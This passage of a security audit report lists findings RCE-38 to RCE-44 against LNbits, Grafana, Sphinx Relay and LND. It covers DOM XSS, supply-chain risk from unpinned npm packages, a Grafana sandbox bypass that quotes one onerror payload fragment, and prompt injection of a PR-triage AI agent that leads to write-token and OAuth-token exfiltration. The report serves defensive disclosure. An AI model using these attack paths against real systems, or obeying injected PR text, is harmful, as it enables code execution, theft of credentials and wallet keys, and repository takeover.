- Re-point installed WASM extension's release tag to Python archive
- On restart: downloaded without hash check, extracted, imported via importlib

### Impact
Arbitrary Python execution in LNbits process. Access to funding-source credentials, auth_secret_key, wallet keys, DB.

---

## RCE-38: LNbits — Extension Builder DOM XSS (innerHTML + loadScript)

**Service:** LNbits
**Severity:** HIGH
**Auth:** LOW (registered user)
**File:** `lnbits/static/js/pages/extensions_builder_preview.js:15-38`

### Root Cause
- Preview page composes innerHTML/script URLs from unvalidated query params
- Traversing ext_id + tinyurl redirect → attacker HTML/JS execution

### Impact
Script execution in admin session. Access to funding credentials via admin API.

---

## RCE-39: LNbits — Unpinned npm Bundle Auto-Committed by CI Bot

**Service:** LNbits
**Severity:** HIGH
**Auth:** NONE (npm package compromise)
**File:** `package.json:25-40, .github/workflows/bundle.yml:19-30`

### Root Cause
- Browser bundle built from unpinned npm caret ranges with no lockfile
- CI bot auto-commits updated bundle with contents:write token
- Compromised axios/dompurify/nostr-tools → auto-bundled into lnbits/static

### Impact
Supply chain code execution on LNbits origin for every user.

---

## RCE-40: Grafana — document.writeln Host Document Replacement

**Service:** Grafana
**Severity:** HIGH
**Auth:** NONE (sandboxed plugin)
**File:** `distortions.ts:439-448`

### Root Cause
- Sandbox blocks document.write but NOT document.writeln/open
- `document.writeln('<img src=x onerror="...">')` replaces host document with plugin HTML
- Script in onerror runs in host realm

### Impact
Host-realm script execution bypassing sandbox.

---

## RCE-41: Grafana — Node Graph SVG Icon → iframe srcdoc Script

**Service:** Grafana
**Severity:** HIGH
**Auth:** LOW (Editor role)
**File:** `public/app/plugins/panel/nodeGraph/Node.tsx:162-167`

### Root Cause
- Query returns icon column containing SVG with foreignObject+iframe srcdoc
- Rendered inline by node graph panel

### Impact
XSS/code execution in victim's Grafana session via datasource query result.

---

## RCE-42: Grafana — Snapshot Viewer Executes Live Datasource Queries

**Service:** Grafana
**Severity:** HIGH
**Auth:** LOW (snapshots:create / Viewer role)
**File:** `transformSaveModelToScene.ts:216-222`

### Root Cause
- POST crafted dashboard body to /api/snapshots with live datasource targets
- Victim opens snapshot link → queries execute with THEIR session credentials
- SQL datasources → mutating statements possible (INSERT/UPDATE/DELETE)

### Impact
Arbitrary query execution against victim's datasources. SQL injection to RCE on backing databases.

---

## RCE-43: Sphinx Relay — Docker Deletes package-lock, Installs Unpinned

**Service:** Sphinx Relay
**Severity:** HIGH
**Auth:** NONE (npm registry compromise)
**File:** Dockerfile

### Root Cause
- Dockerfile deletes package-lock.json before npm install
- npm resolves floating semver ranges → compromised package installed

### Impact
Supply chain code execution in sphinx-relay Docker image with LND macaroon access.

---

## RCE-44: LND — PR Severity Bot Prompt Injection → Write Tokens

**Service:** LND
**Severity:** HIGH
**Auth:** NONE (any PR author)
**File:** PR severity bot workflow

### Root Cause
- AI agent with CLAUDE_CODE_OAUTH_TOKEN and write-capable App token
- Token in environment inherited by tool subprocesses and hooks
- PR title/body crafted to prompt-inject the agent

### Impact
Repository write access and OAuth token exfiltration via prompt injection.
